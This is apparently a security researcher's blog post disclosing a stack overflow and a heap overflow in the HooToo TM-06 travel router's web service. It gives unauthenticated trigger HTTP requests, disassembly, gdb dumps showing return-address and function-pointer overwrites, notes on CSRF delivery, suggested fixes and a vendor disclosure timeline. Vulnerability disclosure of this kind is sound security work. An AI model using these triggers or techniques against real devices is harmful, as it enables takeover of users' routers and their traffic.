---
layout: post
title: HooToo Travel Mate 6 vulnerabilities.
draft: true
hidden: true
---

In the course of reverse engineering the HooToo TM-06 Travel router, there were two interesting vulnerabilities discovered. Both are in the IOOS (vshttpd) web service. This is not shocking because the web service appears to be a custom implementation specific to the device. That's not to say the developers weren't good, rather it is that custom code tends to be the one that receives the least scrutiny. One vulnerability is a stack overflow. Another, a heap overflow. In this article we'll see how to fully exploit the heap buffer overflow vulnerability.

# TL;DR
There is a partial ASLR implemented on the device: the dynamic libraries and the stack move around. So far as I could tell, there were no other significant protections. Both the heap and the stack are writable and executable.

We found two buffer overflows. One is stack based (sprintf), which allows us to overwrite the return address on the executable stack. We were not able to exploit that vulnerability because it requires an information leak. However, it comes with a great attack vector via an XSRF. The other vulnerability is a heap overflow (strcpy) where we are able to overwrite a function pointer on the heap. We then leverage the fact that the heap is predictable, and does not move around, to build a full exploit with arbitrary binary code execution. Finally, we look at proposals on how to fix these vulnerabilities.

# Stack overflow
The HooToo HT-TM06 webserver suffers from a potentially exploitable stack overflow. We say potentially because the memory corruption mitigations, as enforced by the OS, prevent full exploitation. However, given that, historically, claims of non-exploitability have had the tendency of being wrong, I prefer to make it a soft claim. The webserver executes as a privileged process on the router, so an attacker could gain privileged code execution via this vulnerability. In addition to running as a `root` user on the device the process listens to both internal and external interfaces.

## Technical Details:
*Affected versions:* HT-TM06 Firmware 2.000.030

This write up focuses on firmware 2.000.030 because at the time of analysis it was the latest version. However, due to the implementation style observed - abundance of `sprintf`s and other dangerous functions, it is believed that earlier versions will also be vulnerable as well. 

*Binary:* /usr/sbin/ioos

`ioos` is a webserver responsible for handling the CGI content of the HT-TM06 web interface. Labeling itself `vshttd` on HTTP responses, it responds to requests behind a lighttpd proxy. The function of ioos is to coordinate user sessions, authenticate users and reconfigure the system upon request. The webserver is configured to respond to `*.csp` requests such as `GET /protocol.csp`.

Upon closer analysis it was discovered that the ioos webserver has a stack overflow memory corruption vulnerability which can be triggered by an unauthenticated attacker. Most requests require an authentication token in the cookie to process, but the parameters abused by this vulnerability are processed before those checks are completed.

The trigger HTTP request looks as follows:

```
GET /protocol.csp?fname=[long string]&opt=userlock&username=guest&function=get HTTP/1.1
Host: 192.168.1.1
Connection: keep-alive
Cache-Control: no-cache
If-Modified-Since: 0
Accept: */*
Referer: http://192.168.1.1/
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8,ru;q=0.6
```

Notice that the parameter `fname` contains a very long string - longer than 256 bytes. That is what causes the overflow condition. Normally this string is just a few bytes.

A response to this request (without triggering the memory corruption) looks like this:

```
HTTP/1.1 200 OK
Server: vshttpd
Cache-Control: no-cache
Pragma: no-cache
Expires: 0
Content-length: 87
Content-type: text/xml;charset=UTF-8
Set-cookie: SESSID=Xqo72sI1QVtjqoHZWUgOE9 BYbWRzLH7yWvF2PgTv4dPl;
Date: Tue, 24 Jan 2017 15:46:16 GMT

<?xml version="1.0" ?><root><[long string]><waninfo><errno>0</errno></waninfo></[long string]></root>
```

So, it becomes clear that the `fname` parameter is used to construct the XML response string. Looking at the disassembly we can see that the parameter value is used in the `xml_add_elem` function. This function appends a formatted string value to the response message string.

```
xml_add_elem:
.text:00512684 28 01 A2 27    addiu   $v0, $sp, 0x238+var_110  # Add Immediate Unsigned
.text:00512688 21 20 40 00    move    $a0, $v0         # s
.text:0051268C 38 80 85 8F    li      $a1, 0x540000    # Load Immediate
.text:00512690 00 00 00 00    nop
.text:00512694 E8 7A A5 24    addiu   $a1, (aS_19 - 0x540000)  # "</%s>"
.text:00512698 3C 02 A6 8F    lw      $a2, 0x238+element_name($sp)  # Load Word

.text:0051269C E0 87 99 8F    la      $t9, sprintf     # Load Address
.text:005126A0 00 00 00 00    nop
.text:005126A4 09 F8 20 03    jalr    $t9 ; sprintf    # Jump And Link Register
.text:005126A8 00 00 00 00    nop
```

In the disassembly above we can see that the destination string is a stack based buffer: `$sp + (0x238+var_110)`. Since *sprintf* is used instead of *snprintf*, there is nothing to prevent the function from writing past the buffer boundary.

## Exploitation
Why is this issue so serious? Because it gives an unauthenticated attacker the ability to control the Program Counter. How? By allowing the attacker to change the function return address that is stored on the program stack which used to direct execution at the end of the function execution.

As mentioned above the sprintf allows the attacker to write past the buffer boundary. On the stack, the buffer occupies 256 bytes:

```
(gdb) x/100wx $sp+0x128
0x7f8e1f78: 0x00000000 0x00000000 0x00000000 0x00000000
0x7f8e1f88: 0x00000000 0x00000000 0x00000000 0x00000000
0x7f8e1f98: 0x00000000 0x00000000 0x00000000 0x00000000
0x7f8e1fa8: 0x00000000 0x00000000 0x00000000 0x00000000
0x7f8e1fb8: 0x00000000 0x00000000 0x00000000 0x00000000
0x7f8e1fc8: 0x00000000 0x00000000 0x00000000 0x00000000
0x7f8e1fd8: 0x00000000 0x00000000 0x00000000 0x00000000
0x7f8e1fe8: 0x00000000 0x00000000 0x00000000 0x00000000
0x7f8e1ff8: 0x00000000 0x00000000 0x00000000 0x00000000
0x7f8e2008: 0x00000000 0x00000000 0x00000000 0x00000000
0x7f8e2018: 0x00000000 0x00000000 0x00000000 0x00000000
0x7f8e2028: 0x00000000 0x00000000 0x00000000 0x00000000
0x7f8e2038: 0x00000000 0x00000000 0x00000000 0x00000000
0x7f8e2048: 0x00000000 0x00000000 0x00000000 0x00000000
0x7f8e2058: 0x00000000 0x00000000 0x00000000 0x00000000
0x7f8e2068: 0x00000000 0x00000000 0x00000000 0x00000000

0x7f8e2078: 0x00595ea8 0x00000001 0x0043bb04 0x0043b8d0
```

The destination buffer stops at `0x7f8e2078` and begins at `0x7f8e1f78` which the difference being `0x100 (256)` as shown above. After the buffer, there are 8 bytes of local variables. The variables are followed by the saved return address (`$ra` register). This return address is used by the function before it returns. We can see the current value is `0x0043bb04` at location `0x7f8e2078 + 8`.


After the sprintf call at location `.text:005126A4`, the same location on the stack looks like this:

```
(gdb) x/100wx $sp+0x128
0x7f8e1f78: 0x0f242f3c 0xe001fdff 0xe001272b 0x06282728
0x7f8e1f88: 0x0224ffff 0x01015710 0xa2af0c01 0xa48fffff
0x7f8e1f98: 0x0f24ffff 0xe001fdff 0xafaf2778 0x0e3ce0ff
0x7f8e1fa8: 0xce35697a 0xaeaf697a 0x0d3ce4ff 0xad35080a
0x7f8e1fb8: 0xadaf0892 0xa523e6ff 0x0c24e2ff 0x8001efff
0x7f8e1fc8: 0x02242730 0x01014a10 0x0f240c01 0xe001fdff
0x7f8e1fd8: 0xa48f2728 0x0224ffff 0x0101df0f 0xa52b0c01
0x7f8e1fe8: 0x0124ffff 0xa114ffff 0x0628fbff 0x0f3cffff
0x7f8e1ff8: 0xef352f2f 0xafaf6962 0x0e3cf4ff 0xce352f6e
0x7f8e2008: 0xaeaf6873 0xa0aff8ff 0xa427fcff 0x0528f4ff
0x7f8e2018: 0x0224ffff 0x0101ab0f 0x41410c01 0x41414141
0x7f8e2028: 0x41414141 0x41414141 0x41414141 0x41414141
0x7f8e2038: 0x41414141 0x41414141 0x41414141 0x41414141
0x7f8e2048: 0x41414141 0x41414141 0x41414141 0x41414141
0x7f8e2058: 0x41414141 0x41414141 0x41414141 0x41414141
0x7f8e2068: 0x41414141 0x41414141 0x41414141 0x41414141

0x7f8e2078: 0x41414141 0x41414141 0x3e5126d0 0x0043b8d0
```

The return address value has been changed to an attacker specified value which means that the program will jump to that address to continue execution resulting in a crash:

```
Program received signal SIGSEGV, Segmentation fault.
0x3e5126d0 in ?? ()
```

The crash is occurring because the location we send the Program Counter to does not contain any valid instructions. After non-exhaustive attempts at exploitation we found that the partial ASLR deployed on the device was enough to swart our attempts at exploiting this particular vulnerability. There are two constraints that we have to deal with:

1. Due to the use of the `sprintf` function, we cannot have NULLs in the buffer. Not an uncommon constraint.
1. Due to the use of the format string `"</%s>"`, the last character of the buffer must be a _greater than_ sign.

The following scenarios were considered:

- Point the return address to some location is the main binary that would then jump to a buffer on the stack. The stack is executable (great!), however the program is located at a low address that starts with a zero. Due to the ending character in the format string, we cannot manage a zero character even though the architecture is little endian. Normally we'd be able to leverage the NULL that `sprintf` automatically places at the end of the C-String.

- Point the return address to some location in the heap. The heap is executable (great!). We are able to get a buffer into the heap (great!). The heap is at a location just above the main binary which has locations that start with a zero.

- Point the return address to some useful library instruction. I realize that the libraries actually move around between executions due to memory randomization.

- Point the return address directly to our buffer on the stack. The stack is located in high memory and moves around along with the libraries.

```
# sysctl -A | grep kernel.randomize_va_space 2>/dev/null
kernel.randomize_va_space = 1
```

So, in order to exploit this we need to find a memory leak to get one of the last two scenarios to work. This is really unfortunate, we got thwarted by memory randomization and constraints on the format string. 

Nonetheless, this vulnerability is particularly dangerous because, as you can see, it gets us really close to full exploitation. Also, if it works then it can be exploited without authentication and launched from the user's web browser via a cross site request forgery attack. That is because the attack strings could be sent via a pure GET request. Such request can be embedded in some innocent looking page, an `iframe` or via an XSS attack of some unrelated website. In essence we would be able to exploit a user's router through their browser - what a great attack vector!

## The Fix
The bug is trivial to fix. First option is to just use `snprintf` instead of `sprintf`:

```c
snprintf($sp+0x128, 256, “<%s>”, fname);
```

Alternatively, one can also enable the use of stack canaries and recompile the original code. The program will still be remotely crashable, depending on how exceptions are handled, but it should prevent the attacker from directly controlling the program counter.


# Heap overflow
The HooToo HT-TM06 webserver suffers from a potentially exploitable heap overflow. The webserver executes as a privileged process on the router, so an attacker could again privileged code execution via this vulnerability.

## Technical Details:
*Affected versions:* HT-TM06 Firmware 2.000.030

This write up focuses on firmware 2.000.030 because at the time of writing it was the latest version. However, due to the implementation style observed, it is believed that earlier versions will also be vulnerable. 

*Binary:* /usr/sbin/ioos

`ioos` is webserver responsible for handling the CGI content of the HT-TM06 web interface. Labeling itself `vshttd` on HTTP responses, it responds to requests behind a lighttpd proxy. The function of ioos is to coordinate user sessions, authenticate users and reconfigure the system upon request. The webserver is configured to respond to `*.csp` requests such as `GET /protocol.csp`.

Upon closer analysis it was discovered that the ioos webserver has a heap overflow memory corruption vulnerability which can be triggered by an unauthenticated attacker.

The trigger HTTP request looks as follows:

```
GET /protocol.csp?fname=security&opt=userlock&username=guest&function=get HTTP/1.1
Host: 192.168.1.1
Connection: keep-alive
Cache-Control: no-cache
If-Modified-Since: 0
Accept: */*
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8,ru;q=0.6
Cookie: [long string]
```

Notice that the cookie header contains a very long string - longer than 1024 bytes. That is what causes the overflow condition.

```
.text:00521BC4  lw      $v1, 0x40+cgi_tab($sp) # Load Word
.text:00521BC8  li      $v0, 0x16858           # Load Immediate
.text:00521BD0  addu    $v0, $v1, $v0          # Add Unsigned
.text:00521BD4  move    $a0, $v0               # dest
.text:00521BD8  lw      $a1, 0x40+src($sp)     # src

.text:00521BDC  la      $t9, strcpy            # Load Address
.text:00521BE0  nop
.text:00521BE4  jalr    $t9 ; strcpy           # Jump And Link Register

.text:00521BE8  nop
.text:00521BEC  lw      $gp, 0x40+var_28($sp)  # Load Word
```

The above code shows the call to strcpy which copies the user supplied data to an internal `cgi_tab` data structure. The data structure is allocated on the heap with the string buffer, at most, 1028 bytes long. After the string buffer other data follows, specifically function pointers which is a common pattern with data structures used in ioos.

The strcpy call is unbounded and so the unauthenticated user can supply any sized string to be copied into a fixed destination buffer.

## Exploitation
Why is this issue so serious? Because it gives an authenticated attacker control of the Program Counter. How? By allowing the attacker to change the function pointers following a string buffer on the heap. Doing so the attacker can change program flow and potentially execute malware.

As previously mentioned the strcpy will write past the destination buffer end. Let’s see what happens under the microscope. We will set a breakpoint before and after the offending strcpy call.

```
Breakpoint 1, 0x00521bdc in ?? ()
(gdb) display /10i $pc
1: x/10i $pc
=> 0x521bdc: lw t9,-28472(gp)
   0x521be0: nop
   0x521be4: jalr t9    # <- strcpy
   0x521be8: nop
   0x521bec: lw gp,24(sp)
```

Before the call, the parameters look like this:

```
(gdb) x/10wx $a0                                           <- strcpy dest
0x5ad328: 0x00000000 0x00000000 0x00000000 0x00000000
0x5ad338: 0x00000000 0x00000000 0x00000000 0x00000000
0x5ad348: 0x00000000 0x00000000
(gdb) x/10wx $a0+1000                                      <- end of dest
0x5ad710: 0x00000000 0x00000000 0x00000000 0x00000000
0x5ad720: 0x00000000 0x00000000 0x00000000 0x0051b660
0x5ad730: 0x0051b810 0x0051b844 <- Saved return address
(gdb) x/10wx $a1                                           <- strcpy src
0x5ad943: 0x41414141 0x41414141 0x41414141 0x41414141
0x5ad953: 0x41414141 0x41414141 0x41414141 0x41414141
0x5ad963: 0x41414141 0x41414141
(gdb) x/10wx $a1+1000                                      <- end of src
0x5add2b: 0x41414141 0x41414141 0x41414141 0x41414141
0x5add3b: 0x41414141 0x41414141 0x41414141 0x41414141
0x5add4b: 0x41414141 0x42ff4242 <- Saved return address
```

The snippet above shows the destination and the source buffers. The source being controlled by the attacker, we see that the attacker is ready to supply a new pointer value. Now, let’s breakpoint just after the `strcpy` call.

```
Breakpoint 2, 0x00521bec in ?? ()
1: x/10i $pc
=> 0x521bec: lw gp,24(sp)
   0x521bf0: b 0x521c08
   0x521bf4: nop
```

The end of the original destination buffer now looks like this:

```
(gdb) x/10wx $a0+1000
0x5ad710: 0x41414141 0x41414141 0x41414141 0x41414141
0x5ad720: 0x41414141 0x41414141 0x41414141 0x41414141
0x5ad730: 0x41414141 0x42ff4242
```

Notice that the addresses on the destination buffer match exactly and the the pointer at `0x5ad730 + 4` has a new value `0x42ff4242` which is clearly invalid. If we let the program run we see that the program will use this address to look for instructions to execute:

```
Program received signal SIGBUS, Bus error.
0x42ff4242 in ?? ()
1: x/10i $pc
=> 0x42ff4242: <error: Cannot access memory at address 0x42ff4240>
```

Not good! The new pointer takes effect slightly further down the execution path from the strcpy overwrite:

```
.text:004136A4  addu    $v0, $v1, $v0         # Add Unsigned
.text:004136A8  lw      $t9, 0x6C64($v0)      # Load Word
.text:004136AC  lw      $a0, 0x28+var_C($sp)  # Load Word
.text:004136B0  jalr    $t9                   # <- gain PC control
.text:004136B4  nop
.text:004136B8  lw      $gp, 0x28+var_18($sp) # Load Word
```

The purpose of the above function is unknown but this is where the attacker gains control of the execution. This vulnerability is very much exploitable. What we notice is that the heap is allocated a low addresses and its structure is not randomized. This means that the heap allocations are at predictable addresses and the way that the server is implemented makes the malloc allocations predictable. It is probably due to minimal implementation of the heap algorithms for the embedded system as well as the server's single threaded model. So, we were able to insert a static address into our exploit buffer. Then we can point the program counter to our shellcode and take control of the device!

Unlike the stack overflow vulnerability, this one requires a more complex HTTP request. This means that the attack vector gets a little more complicated. However, since the device listens to all interfaces we can exploit the router directly from, say, a WiFi router that it connects to.

## Fix
The bug is trivial to fix. As a general rule `strcpy` is considered dangerous and should be avoided. Instead, use `strncpy` which accepts the size of the destination buffer as a parameter which would prevent such overwrites.

As an additional measure of protection, the function pointers on the heap should be XORed with a execution specific random integer. This way an attacker would not be able to overwrite them with useful values thereby preventing exploitation attempts.


# Reporting to the vendor
Both vulnerabilities were reported to the Vendor on January 24, 2017 (stack overflow) and January 21, 2017 (heap overflow). The company quickly acknowledged their receipt and provided a new build with a patch on February 19, 2017. I found it interesting that HooToo has provided the update to me personally rather than making it generally available. Their download page was later updated on March 7, 2017. I would have expected them to take a higher priority for a much faster patch.

Upon examining the change log, I only saw this line:
```
fix the bug caused by fname protocol
```

# Conclusion
There are many reasons why an attacker might want to exploit these devices. One obvious reason is to gain access to the user’s information or manipulate user activity. Having malware on the router means that the attacker could potentially see unencrypted traffic, modify their DNS lookups to enable man-in-the-middle attacks or inject malicious content into traffic. For example, have the ability to inject iframes for browser exploitation or catch vulnerable update mechanisms [2].

Other reasons for leveraging the vulnerabilities in the travel routers are a bit more indirect. One is to obfuscate attack sources and make attribution harder by creating a jump point [1]. Another is to use the router to infect other systems. A person using the travel router would likely be traveling a lot and touching many different networks from a position of some trust. These networks could include hotels, airbnb’s, private residences, cafes and enterprises. And so, having malware on the device would give an attacker a foothold inside another network.

Both of the aforementioned discovered vulnerabilities on the device are web based and require the attacker to have direct access via an IP address. The easiest way is via a user connected to the WiFi created by the device. However, another way is to go from the outside network. That is because the webserver doesn’t just listen on the internal network, it listens on all interfaces. And so, if an AirBnB network has been compromised then an attacker could discover the router as the client on the WiFi and launch the attacks. There is already an example of malware for Android caught in the wild attacking host WiFi routers [3].

The stack overflow vulnerability presents another interesting opportunity for the attacker because it doesn’t require the attacker to be on the network along side the device. It has been previously reported [4] that the device is vulnerable to Cross Site Request Forgery attacks. Since the overflow is in processing a GET request field, it means that the attacker just needs a user to open a page with a forged request to gain execution on the router. Now, that is an awesome attack vector!

# References
[1] [WAVE YOUR FALSE FLAGS! DECEPTION TACTICS MUDDYING ATTRIBUTION IN TARGETED ATTACKS.](https://securelist.com/files/2016/10/Bartholomew-GuerreroSaade-VB2016.pdf)

[2] [Update Services Vulnerability Summary](https://www.tenable.com/sc-dashboards/update-services-vulnerability-summary)

[3] [Switcher: Android joins the ‘attack-the-router’ club](https://securelist.com/blog/mobile/76969/switcher-android-joins-the-attack-the-router-club/)
